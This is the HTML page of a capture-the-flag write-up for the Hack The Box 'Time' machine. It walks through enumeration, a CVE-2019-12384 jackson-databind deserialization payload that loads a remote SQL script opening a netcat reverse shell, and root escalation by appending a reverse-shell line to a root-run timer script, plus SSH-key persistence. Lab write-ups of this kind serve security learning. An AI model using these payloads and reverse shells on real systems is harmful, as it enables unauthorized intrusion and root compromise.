@@ -1,0 +1,1210 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.21.0 by Michael Rose
+  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Hackthebox write-up: Time | Davi Cruz</title>
+<meta name="description" content="Hello everyone!  The machine of this week will be Time, another Linux box medium rated from Hack The Box, created by  egotisticalSW and felamos.">
+
+
+  <meta name="author" content="Davi Cruz">
+  
+  <meta property="article:author" content="Davi Cruz">
+  
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Davi Cruz">
+<meta property="og:title" content="Hackthebox write-up: Time">
+<meta property="og:url" content="https://davicruz.com/writeup/2021/04/htb-time/">
+
+
+  <meta property="og:description" content="Hello everyone!  The machine of this week will be Time, another Linux box medium rated from Hack The Box, created by  egotisticalSW and felamos.">
+
+
+
+  <meta property="og:image" content="https://i.imgur.com/dL9pe5L.png">
+
+
+
+  <meta name="twitter:site" content="@zerahzurc">
+  <meta name="twitter:title" content="Hackthebox write-up: Time">
+  <meta name="twitter:description" content="Hello everyone!  The machine of this week will be Time, another Linux box medium rated from Hack The Box, created by  egotisticalSW and felamos.">
+  <meta name="twitter:domain" content="davicruz.com">
+  <meta name="twitter:url" content="https://davicruz.com/writeup/2021/04/htb-time/">
+
+  
+    <meta name="twitter:card" content="summary">
+    
+      <meta name="twitter:image" content="https://i.imgur.com/dL9pe5L.png">
+    
+  
+
+  
+
+
+
+  <meta property="article:published_time" content="2021-04-03T13:00:00-03:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="https://davicruz.com/writeup/2021/04/htb-time/">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": "Davi Cruz",
+      "url": "https://davicruz.com/",
+      "sameAs": ["https://twitter.com/zerahzurc","https://www.linkedin.com/in/davicruz","https://github.com/davi-cruz"]
+    
+  }
+</script>
+
+
+  <meta name="google-site-verification" content="hrWV-PqvbpxEy2HdpVYFQNws2Sz_tROleVyF18s2kWA" />
+
+
+  <meta name="msvalidate.01" content="60B1FA6CDAF15D226AB529AF30386BD8">
+
+
+
+  <meta name="yandex-verification" content="08de8d8c0326420f">
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Davi Cruz Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css">
+
+<!--[if IE]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+<!-- Favicon -->
+<link rel="shortcut icon" href="/assets/images/favicon.ico" />
+
+<!-- Multilang tags -->
+
+    
+<link rel="alternate" hreflang="pt-BR" href="/writeup/2021/04/htb-time/">
+    
+
+    
+<link rel="alternate" hreflang="en-US" href="/en-US/writeup/2021/04/htb-time/">
+    
+
+
+<!-- Cookie Consent - Osano -->
+<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/cookieconsent@3/build/cookieconsent.min.css" />
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+    <nav class="skip-links">
+  <h2 class="screen-reader-text">Skip links</h2>
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          
+          <a class="site-logo" href="https://davicruz.com/en-US"><img src="/assets/images/logo.png" alt=""></a>
+          
+          <a class="site-title" href="https://davicruz.com/en-US">
+            Davi Cruz
+            
+          </a>
+        
+        <ul class="visible-links">
+<li class="masthead__menu-item">
+            <a href="/en-US/categories/">Categories</a>
+          </li>
+<li class="masthead__menu-item">
+            <a href="/en-US/tag/">Tags</a>
+          </li>
+<li class="masthead__menu-item">
+            <a href="/en-US/about/">About</a>
+          </li>
+</ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 15.99 16">
+            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
+          </svg>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+        <img src="/assets/images/bio-photo.jpg" alt="Davi Cruz" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">Davi Cruz</h3>
+    
+    
+      <div class="author__bio" itemprop="description">
+        <p>Just another Cybersecurity professional</p>
+
+      </div>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">São Paulo, BR</span>
+        </li>
+      
+
+      
+        
+          
+            <li><a href="https://linkedin.com/in/davicruz" rel="nofollow noopener noreferrer"><i class="fab fa-fw fab fa-linkedin" aria-hidden="true"></i><span class="label">Linkedin</span></a></li>
+          
+        
+          
+            <li><a href="https://twitter.com/zerahzurc" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
+          
+        
+          
+            <li><a href="https://github.com/davi-cruz" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+<li>
+  <strong></strong>
+  
+  <a class="link-br" href=""></a>
+  
+</li>
+
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Hackthebox write-up: Time">
+    <meta itemprop="description" content="Hello everyone!The machine of this week will be Time, another Linux box medium rated from Hack The Box, created by egotisticalSW and felamos.">
+    <meta itemprop="datePublished" content="2021-04-03T13:00:00-03:00">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Hackthebox write-up: Time
+</h1>
+          
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-calendar-alt" aria-hidden="true"></i>
+        <time datetime="2021-04-03T13:00:00-03:00">April 3, 2021</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          4 minute read
+        
+      </span>
+    
+
+
+      <!-- Start Read in other languages-->
+        <span class="page__meta-sep page__meta-lang"></span>
+        
+        
+        
+        <span class="page__meta-lang"><a href="/writeup/2021/04/htb-time/">Leia também em  <img class="emoji" title=":brazil:" alt=":brazil:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f1e7-1f1f7.png" height="20" width="20"></a></span>
+        
+
+        
+
+        
+
+        
+        
+        
+        
+      <!-- End Read in other languages-->
+      <span class="page__meta-sep page__meta-share"></span>
+      <span class="page__meta-share">
+        <i class="fas fa-share-alt" aria-hidden="true"></i>
+        <a href="#sharelinks">Share</a>
+      </span>
+  </p>
+
+
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p>Hello everyone!</p>
+
+<p>The machine of this week will be <strong>Time</strong>, another Linux box medium rated from <a href="https://www.hackthebox.eu">Hack The Box</a>, created by <a href="https://app.hackthebox.eu/users/94858">
+egotisticalSW</a> and <a href="https://app.hackthebox.eu/users/27390">felamos</a>.<!--more--></p>
+
+<p class="notice--info"><img class="emoji" title=":information_source:" alt=":information_source:" src="https://github.githubassets.com/images/icons/emoji/unicode/2139.png" height="20" width="20"> <strong>Info</strong>: Write-ups for Hack the Box are always posted as soon as machines get retired.</p>
+
+<p><img src="https://i.imgur.com/UViaunV.png" alt="HTB Time" class="align-center"></p>
+
+<h2 id="enumeration">Enumeration</h2>
+
+<p>We start with the enumeration of published services using a <code class="language-plaintext highlighter-rouge">nmap</code> quick scan, where we can see the output below:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-Pn</span> <span class="nt">-oA</span> quick 10.10.10.214
+Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>will be slower.
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-02-26 16:08 <span class="nt">-03</span>
+Nmap scan report <span class="k">for </span>10.10.10.214
+Host is up <span class="o">(</span>0.077s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey:
+|   3072 0f:7d:97:82:5f:04:2b:e0:0a:56:32:5d:14:56:82:d4 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 24:ea:53:49:d8:cb:9b:fc:d6:c4:26:ef:dd:34:c1:1e <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 fe:25:34:e4:3e:df:9f:ed:62:2a:a4:93:52:cc:cd:27 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Online JSON parser
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>10.70 seconds
+</code></pre></div></div>
+
+<h3 id="80tcp---http-service">80/TCP - HTTP Service</h3>
+
+<p>Starting by checking the HTTP service published on port 80, noticed that we have a JSON Validation and Beautifier service.</p>
+
+<p><img src="https://i.imgur.com/KWUpOXL.png" alt="Online JSON Parser - Time" class="align-center"></p>
+
+<p>After some enumeration with <code class="language-plaintext highlighter-rouge">whatweb</code> and <code class="language-plaintext highlighter-rouge">nikto</code> I haven’t found anything useful, so I proceeded to app experimentation, looking for some vulnerability that could lead us to some code injection or LFI.</p>
+
+<p>Analyzing the application, we have two functionalities: <strong>Beautify</strong> and <strong>Validate</strong>:</p>
+
+<ul>
+  <li>The option beautify, after receiving a valid JSON, formats it in a pretty manner and, sending an invalid content (e.g. “test”), returns a <code class="language-plaintext highlighter-rouge">null</code> value.</li>
+</ul>
+
+<p><img src="https://i.imgur.com/gwqqcNt.png" alt="Online JSON Parser - Time - beautify" class="align-center"></p>
+
+<ul>
+  <li>
+    <p>The Validate option (in beta) checks the syntax of the JSON provided. When we send an invalid request (e.g. “test”), the exception below is returned.</p>
+
+    <div class="language-plaintext highlighter-rouge">
+<div class="highlight"><pre class="highlight"><code>Validation failed: Unhandled Java exception: com.fasterxml.jackson.core.JsonParseException: Unrecognized token 'test': was expecting 'null', 'true', 'false' or NaN
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<h2 id="initial-access">Initial Access</h2>
+
+<p>After searching for <code class="language-plaintext highlighter-rouge">com.fasterxml.jackson.core</code> I have found about <strong>Jackson</strong> project, developed by <strong>FasterXML</strong> and from which core is the base component for <a href="https://github.com/FasterXML/jackson-databind">jackson-databind</a>, a popular JSON library, here used to implement the formatting and validating features.</p>
+
+<p>Looking for CVEs on jackson-databind, I have found the following for code execution published in 2019, according to the page <a href="https://www.cvedetails.com">CVE Details</a>:</p>
+
+<p><img src="https://i.imgur.com/ju87o1J.png" alt="CVE Details" class="align-center"></p>
+
+<p>Of the 4 listed, I have found for <strong>CVE-2019-12384</strong> a working PoC at <a href="https://blog.doyensec.com/2019/07/22/jackson-gadgets.html">this blog</a>, which I have used to gain initial access to the box. The following steps were used to get a reverse shell:</p>
+
+<ul>
+  <li>
+    <p>Created a file called <code class="language-plaintext highlighter-rouge">inject.sql</code> with the code below, modified from the version at the blog, to start a reverse shell to the attacker machine at 4443 and published using a python3 HTTP server (<code class="language-plaintext highlighter-rouge">sudo python3 -m http.server 80</code>) from the directory where the file resides.</p>
+
+    <div class="language-sql highlighter-rouge">
+<div class="highlight"><pre class="highlight"><code><span class="k">CREATE</span> <span class="k">ALIAS</span> <span class="n">SHELLEXEC</span> <span class="k">AS</span> <span class="err">$$</span> <span class="n">String</span> <span class="n">shellexec</span><span class="p">(</span><span class="n">String</span> <span class="n">cmd</span><span class="p">)</span> <span class="n">throws</span> <span class="n">java</span><span class="p">.</span><span class="n">io</span><span class="p">.</span><span class="n">IOException</span> <span class="err">{</span>
+    <span class="n">String</span><span class="p">[]</span> <span class="n">command</span> <span class="o">=</span> <span class="err">{</span><span class="nv">"bash"</span><span class="p">,</span> <span class="nv">"-c"</span><span class="p">,</span> <span class="n">cmd</span><span class="err">}</span><span class="p">;</span>
+    <span class="n">java</span><span class="p">.</span><span class="n">util</span><span class="p">.</span><span class="n">Scanner</span> <span class="n">s</span> <span class="o">=</span> <span class="k">new</span> <span class="n">java</span><span class="p">.</span><span class="n">util</span><span class="p">.</span><span class="n">Scanner</span><span class="p">(</span><span class="n">Runtime</span><span class="p">.</span><span class="n">getRuntime</span><span class="p">().</span><span class="k">exec</span><span class="p">(</span><span class="n">command</span><span class="p">).</span><span class="n">getInputStream</span><span class="p">()).</span><span class="n">useDelimiter</span><span class="p">(</span><span class="nv">"</span><span class="se">\\</span><span class="nv">A"</span><span class="p">);</span>
+    <span class="k">return</span> <span class="n">s</span><span class="p">.</span><span class="n">hasNext</span><span class="p">()</span> <span class="o">?</span> <span class="n">s</span><span class="p">.</span><span class="k">next</span><span class="p">()</span> <span class="p">:</span> <span class="nv">""</span><span class="p">;</span>  <span class="err">}</span>
+<span class="err">$$</span><span class="p">;</span>
+<span class="k">CALL</span> <span class="n">SHELLEXEC</span><span class="p">(</span><span class="s1">'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.10 4443 &gt;/tmp/f'</span><span class="p">)</span>
+</code></pre></div>    </div>
+  </li>
+  <li>Configured listener using netcat by running <code class="language-plaintext highlighter-rouge">nc -lnvp 4443</code>.</li>
+  <li>
+    <p>Sent payload below in the application instead of a JSON content to be validated.</p>
+
+    <div class="language-plaintext highlighter-rouge">
+<div class="highlight"><pre class="highlight"><code>["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.10.10/inject.sql'"}]
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<p><img src="https://i.imgur.com/xsb87hN.png" alt="Listener and Webserver - Time" class="align-center"></p>
+
+<p><img src="https://i.imgur.com/SiAG5hB.png" alt="Online Json Parser - Sending the payload" class="align-center"></p>
+
+<h2 id="user-flag">User flag</h2>
+
+<p>After upgrading the shell, started enumeration where was identified that the user we were using, <strong>pericles</strong>, was a regular Linux user with no special permissions granted.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pericles@time:/var/www/html<span class="nv">$ </span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>pericles<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>pericles<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>pericles<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Acessing its root directory found the user flag, as below.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pericles@time:/var/www/html<span class="nv">$ </span><span class="nb">cd</span> ~
+pericles@time:/home/pericles<span class="nv">$ </span><span class="nb">cat </span>user.txt 
+&lt;redacted&gt;
+pericles@time:/home/pericles<span class="nv">$ </span>
+</code></pre></div></div>
+
+<h2 id="root-flag">Root flag</h2>
+
+<p>Before continuing enumeration, to make easier regaining access if needed, created a SSH key using <code class="language-plaintext highlighter-rouge">ssh-keygen</code> and configured the public key in the file <code class="language-plaintext highlighter-rouge">~/.ssh/authorized_keys</code>, allowing us to directly connect to the user pericles via SSH.</p>
+
+<p>The enumeration was done by running <code class="language-plaintext highlighter-rouge">linpeas.sh</code> and one of the findings called attention, referring to the machine name: a shell file owned by <code class="language-plaintext highlighter-rouge">pericles</code> in the path <code class="language-plaintext highlighter-rouge">/usr/bin/timer_backup.sh</code>.</p>
+
+<p>This file is configured as a <strong>system timer</strong> (<code class="language-plaintext highlighter-rouge">/etc/systemd/system/timer_backup.timer</code> and <code class="language-plaintext highlighter-rouge">/etc/systemd/system/timer_backup.service</code>) and set be executed <strong>every 10 seconds</strong> as <code class="language-plaintext highlighter-rouge">root</code>.</p>
+
+<p>As we have enough permissions to edit the shell script, I have added the line below to return a reverse shell on the attacker machine and, after a few seconds, a reverse shell was obtained! <img class="emoji" title=":smile:" alt=":smile:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f604.png" height="20" width="20"></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">rm</span> /tmp/g<span class="p">;</span><span class="nb">mkfifo</span> /tmp/g<span class="p">;</span><span class="nb">cat</span> /tmp/g|/bin/sh <span class="nt">-i</span> 2&gt;&amp;1|nc 10.10.10.10 4443 <span class="o">&gt;</span>/tmp/g
+</code></pre></div></div>
+
+<p>As the process is re-executed every 10 sec the process tree is terminated, and we lose the existing connection to the machine. To just get the root flag this time is sufficient, which was as done initially.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-lnvp</span> 4443
+listening on <span class="o">[</span>any] 4443 ...
+connect to <span class="o">[</span>10.10.10.10] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.214] 33304
+/bin/sh: 0: can<span class="s1">'t access tty; job control turned off
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# cat /root/root.txt
+&lt;redacted&gt;
+#      
+</span></code></pre></div></div>
+
+<p>In case you want to get a persistent connection at this machine we have two initial options:</p>
+
+<ul>
+  <li>Configure the system timer to add the public key in the <code class="language-plaintext highlighter-rouge">/root/.ssh/authorized_keys</code> file, allowing us to SSH as <code class="language-plaintext highlighter-rouge">root</code>.</li>
+  <li>Spawn another reverse shell as soon as we get the initial connection, which can be done in multiple ways like Metasploit AutoRunScript and <code class="language-plaintext highlighter-rouge">netcat</code>, prepending the listener with the instruction to send the payload as soon as it gets connected, as you can see an example below where the <code class="language-plaintext highlighter-rouge">id</code> command is executed as soon as the session is started:</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">printf</span> <span class="s2">"id</span><span class="se">\n</span><span class="s2">"</span> | nc <span class="nt">-lnvp</span> 4443
+</code></pre></div></div>
+
+<p>I hope this was useful to you and see you guys in the next post! <img class="emoji" title=":smiley:" alt=":smiley:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f603.png" height="20" width="20"></p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/en-US/tag/#hackthebox" class="page__taxonomy-item" rel="tag">HackTheBox</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/en-US/tag/#htb-linux" class="page__taxonomy-item" rel="tag">htb-linux</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/en-US/tag/#htb-medium" class="page__taxonomy-item" rel="tag">htb-medium</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/en-US/categories/#writeup" class="page__taxonomy-item" rel="tag">Writeup</a>
+    
+    </span>
+  </p>
+
+
+        
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2021-04-03T13:00:00-03:00">April 3, 2021</time></p>
+
+
+      </footer>
+
+      <section id="sharelinks" class="page__share">
+  
+    <h4 class="page__share-title">Share on</h4>
+  
+
+  <a href="https://twitter.com/intent/tweet?via=zerahzurc&amp;text=Hackthebox+write-up%3A+Time%20https%3A%2F%2Fdavicruz.com%2Fwriteup%2F2021%2F04%2Fhtb-time%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fdavicruz.com%2Fwriteup%2F2021%2F04%2Fhtb-time%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3A%2F%2Fdavicruz.com%2Fwriteup%2F2021%2F04%2Fhtb-time%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+
+  <a href="whatsapp://send?text=https%3A%2F%2Fdavicruz.com%2Fwriteup%2F2021%2F04%2Fhtb-time%2F" data-action="share/whatsapp/share" class="btn btn--whatsapp" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Whatsapp"><i class="fab fa-fw fa-whatsapp" aria-hidden="true"></i><span> Whatsapp</span></a>
+
+  <a href="https://telegram.me/share/url?url=https%3A%2F%2Fdavicruz.com%2Fwriteup%2F2021%2F04%2Fhtb-time%2F&amp;text=Hackthebox+write-up%3A+Time" class="btn btn--telegram" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Telegram"><i class="fab fa-fw fa-telegram-plane" aria-hidden="true"></i><span> Telegram</span></a>
+
+
+</section>
+
+
+      
+  <nav class="pagination">
+    
+    
+      <a href="/en-US/azure-arc/2021/04/install-update-azure-arc-windows-configmgr/" class="pagination--pager" title="Azure Arc enabled Servers: Deployment and Update using Configuration Manager
+">Previous</a>
+    
+    
+    
+      
+        <a href="/en-US/writeup/2021/04/htb-laboratory/" class="pagination--pager" title="Hackthebox write-up: Laboratory
+">Next</a>
+        
+    
+  </nav>
+
+    </div>
+
+    
+      <div class="page__comments">
+  
+  
+      <h4 class="page__comments-title">Leave a comment</h4>
+      <section id="utterances-comments"></section>
+    
+</div>
+
+    
+  </article>
+
+  
+  
+    <div class="page__related">
+      <h4 class="page__related-title">You may also enjoy</h4>
+      <div class="grid__wrapper">
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="https://i.imgur.com/BmkB4rb.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+      
+      
+      <a href="https://davicruz.com/en-US/writeup/2021/06/htb-tenet/" rel="permalink">Hackthebox write-up: Tenet
+</a>
+      
+      
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        <time datetime="2021-06-12T13:00:00-03:00">June 12, 2021</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          7 minute read
+        
+      </span>
+    
+
+
+      <!-- Start Read in other languages-->
+        <span class="page__meta-sep page__meta-lang"></span>
+        
+        
+        
+        <span class="page__meta-lang"><a href="/writeup/2021/04/htb-time/">Leia também em  <img class="emoji" title=":brazil:" alt=":brazil:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f1e7-1f1f7.png" height="20" width="20"></a></span>
+        
+
+        
+
+        
+
+        
+        
+        
+        
+      <!-- End Read in other languages-->
+      <span class="page__meta-sep page__meta-share"></span>
+      <span class="page__meta-share">
+        <i class="fas fa-share-alt" aria-hidden="true"></i>
+        <a href="#sharelinks">Share</a>
+      </span>
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Hello guys!
+
+This week’s machine will be Tenet, another medium-rated Linux box from Hack The Box, created by egotisticalSW.
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="https://i.imgur.com/wHnMfBz.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+      
+      
+      <a href="https://davicruz.com/en-US/writeup/2021/06/htb-scriptkiddie/" rel="permalink">Hackthebox write-up: ScriptKiddie
+</a>
+      
+      
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        <time datetime="2021-06-05T13:00:00-03:00">June 5, 2021</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          5 minute read
+        
+      </span>
+    
+
+
+      <!-- Start Read in other languages-->
+        <span class="page__meta-sep page__meta-lang"></span>
+        
+        
+        
+        <span class="page__meta-lang"><a href="/writeup/2021/04/htb-time/">Leia também em  <img class="emoji" title=":brazil:" alt=":brazil:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f1e7-1f1f7.png" height="20" width="20"></a></span>
+        
+
+        
+
+        
+
+        
+        
+        
+        
+      <!-- End Read in other languages-->
+      <span class="page__meta-sep page__meta-share"></span>
+      <span class="page__meta-share">
+        <i class="fas fa-share-alt" aria-hidden="true"></i>
+        <a href="#sharelinks">Share</a>
+      </span>
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Hello guys!
+
+This week’s machine will be ScriptKiddie, another easy-rated Linux box from Hack The Box, created by 0xdf.
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="https://i.imgur.com/FTjLM76.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+      
+      
+      <a href="https://davicruz.com/en-US/writeup/2021/05/htb-delivery/" rel="permalink">Hackthebox write-up: Delivery
+</a>
+      
+      
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        <time datetime="2021-05-22T13:00:00-03:00">May 22, 2021</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
